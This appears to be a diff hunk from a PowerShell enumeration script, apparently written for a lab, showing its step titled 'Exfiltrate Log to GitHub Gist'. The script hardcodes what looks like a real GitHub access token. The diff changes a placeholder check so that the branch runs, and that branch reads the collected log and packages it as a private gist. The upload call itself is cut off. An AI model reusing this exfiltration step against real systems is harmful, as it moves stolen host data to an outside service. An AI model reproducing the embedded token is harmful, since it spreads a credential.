@@ -53,7 +53,7 @@ foreach ($server in $targets) {
 
 # 4. Exfiltrate Log to GitHub Gist
 $githubToken = "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" # Replace with your PAT
-if ($githubToken -ne "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") {
+if ($githubToken -ne "Your token here") {
     Write-Host "Exfiltrating logs to GitHub..." -ForegroundColor Cyan
     $content = Get-Content $logPath -Raw
     $body = @{ description="Lab Enum"; public=$false; files=@{"enum.txt"=@{content=$content}}} | ConvertTo-Json
